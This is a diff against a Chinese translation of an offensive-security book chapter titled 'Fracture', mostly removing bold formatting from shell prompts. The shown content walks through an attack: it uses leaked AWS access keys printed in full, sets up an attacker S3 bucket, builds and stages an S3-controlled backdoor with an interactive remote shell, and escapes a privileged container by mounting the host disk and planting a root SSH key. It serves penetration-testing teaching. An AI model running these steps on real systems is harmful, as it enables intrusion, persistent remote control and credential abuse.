@@ -1,6 +1,4 @@
-# 6
-
-Fracture
+# Fracture
 
 ![](img/chapterart.png)
 
@@ -204,12 +202,12 @@ SES_RO_SECRETKEY = "M0pQIv3FlDXnbyNFQurMZ9ynxD0gdNkRUP1rO03Z" 2
 你可能记得我们在第四章中通过在 Gist 和 Pastebin 上查找公共笔记时，发现了那个可疑的 *surveysandstats.com* 网站。根据我们目前知道的，它可能是一个与我们的真正目标无关的完全独立的组织。让我们查明真相。首先，我们将尝试获取账户 ID，这只需一次 API 调用，并且不需要任何特殊权限，因此我们可以使用刚刚找到的 SES 密钥。每个默认情况下都有访问此信息的 AWS IAM 用户。在 清单 6-2 中，我们使用了从 清单 6-1 获取的访问密钥 1 和秘密密钥 2 来获取账户 ID。
 
 ```
-root@Point1:~/# **vi ~/.aws/credentials**
+root@Point1:~/# vi ~/.aws/credentials
 [ses]
 aws_access_key_id = **AKIA44ZRK6WSSKDSKJPV**
 aws_secret_access_key = **M0pQIv3FlDXnbyNFQurMZ9ynxD0gdNkRUP1r0o3Z**
 
-root@Point1:~/# **aws sts get-caller-identity --profile ses**
+root@Point1:~/# aws sts get-caller-identity --profile ses
 {
   "UserId": "AIDA4XSWK3WS9K6IDDD0V",
   "Account": "886371554408",
@@ -262,7 +260,7 @@ email=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__.__subcla
 我们首先创建一个名为 mxrads-archives-packets-linux 的存储桶：
 
 ```
-root@Point1:~/# **aws s3api create-bucket \**
+root@Point1:~/# aws s3api create-bucket \
 **--bucket mxrads-archives-packets-linux \**
 **--region=eu-west-1 \**
 **--create-bucket-configuration \**
@@ -272,7 +270,7 @@ root@Point1:~/# **aws s3api create-bucket \**
 接着，我们将一个虚拟文件上传到我们的存储桶并命名为*beaconTest.html*：
 
 ```
-root@Point1:~/# **aws s3api put-object \**
+root@Point1:~/# aws s3api put-object \
 **--bucket mxrads-archives-packets-linux \**
 **--key beaconTest.html \**
 **--body beaconTest.html**
@@ -281,7 +279,7 @@ root@Point1:~/# **aws s3api put-object \**
 然后，我们将该文件设为公开：
 
 ```
-root@Point1:~/# **aws s3api put-bucket-policy \**
+root@Point1:~/# aws s3api put-bucket-policy \
 **--bucket mxrads-archives-packets-linux \**
 **--policy file://<(cat <<EOF**
 **{**
@@ -389,10 +387,10 @@ Golang 通过从一开始就不引入异常来处理异常。大多数调用返�
 我们将源代码编译成一个名为*runcdd*的可执行文件，并将其上传到我们的 S3 桶中，它将静静地待在那里，随时待命：
 
 ```
-root@Point1:~/# **git clone** **https://github.com/HackLikeAPornstar/GreschPolitico**
-root@Point1:~/# **cd S3Backdoor/S3Agent**
-root@Point1:~/# **go build -ldflags="-s -w" -o ./runcdd main.go**
-root@Point1:~/# **aws s3api put-object \**
+root@Point1:~/# git clone **https://github.com/HackLikeAPornstar/GreschPolitico**
+root@Point1:~/# cd S3Backdoor/S3Agent
+root@Point1:~/# go build -ldflags="-s -w" -o ./runcdd main.go
+root@Point1:~/# aws s3api put-object \
 **--bucket mxrads-archives-packets-linux \**
 **--key runcdd \**
 **--body runcdd**
@@ -405,7 +403,7 @@ Go 的一些令人烦恼的地方之一是，它会将最终的二进制文件�
 操作符部分遵循非常相似但相反的逻辑：它推送命令并获取结果，同时模仿交互式 Shell。你将会在相同的仓库中找到这次使用 Python 编写的代码：
 
 ```
-root@Point1:~/S3Op/# **python main.py**
+root@Point1:~/S3Op/# python main.py
 Starting a loop fetching results from S3 mxrads-archives-packets-linux
 Queue in commands to be executed
 shell>
@@ -431,7 +429,7 @@ chmod +x runcdd
 然后我们在机器上运行操作符：
 
 ```
-root@Point1:~S3Fetcher/# **python main.py**
+root@Point1:~S3Fetcher/# python main.py
 Starting a loop fetching results from S3 mxrads-archives-packets-linux
 
 New target called home d5d380c41fa4
@@ -482,26 +480,26 @@ overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/6CWK4O7ZJREMTO
 
 ```
 # Demo lab
-root@DemoContainer:/# **ls /dev**
+root@DemoContainer:/# ls /dev
 autofs           kmsg                ppp       tty10
 bsg              lightnvm            psaux     tty11
 `--snip--`
 # tty devices are usually filtered out by cgroups, so we must be inside a privileged container
 
-root@DemoContainer:/# **fdisk -l**
+root@DemoContainer:/# fdisk -l
 Disk /dev/dm-0: 23.3 GiB, 25044189184 bytes, 48914432 sectors
 Units: sectors of 1 * 512 = 512 bytes
 `--snip--`
 
 # mount the host's main partition
-root@DemoContainer:/# **mount /dev/dm-0 /mnt && ls /mnt**
+root@DemoContainer:/# mount /dev/dm-0 /mnt && ls /mnt
 bin   dev  home lib  lost+found  mnt  proc...
 
 # inject our SSH key into the root home folder
 root@DemoContainer:/# echo "ssh-rsa AAAAB3NzaC1yc2EA..." > /mnt/root/.ssh/authorized_keys
 
 # get the host's IP and SSH into it
-root@DemoContainer:/# **ssh root@172.17.0.1**
+root@DemoContainer:/# ssh root@172.17.0.1
 
 root@host:/#
 ```
@@ -524,7 +522,7 @@ CapEff: 00000000a80425fb
 CapBnd: 00000000a80425fb
 CapAmb: 0000000000000000
 
-root@Bouncer:/# **capsh --decode=00000000a80425fb**
+root@Bouncer:/# capsh --decode=00000000a80425fb
 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid
 ,cap_kill,cap_setgid,cap_setuid,cap_setpcap,...
 ```
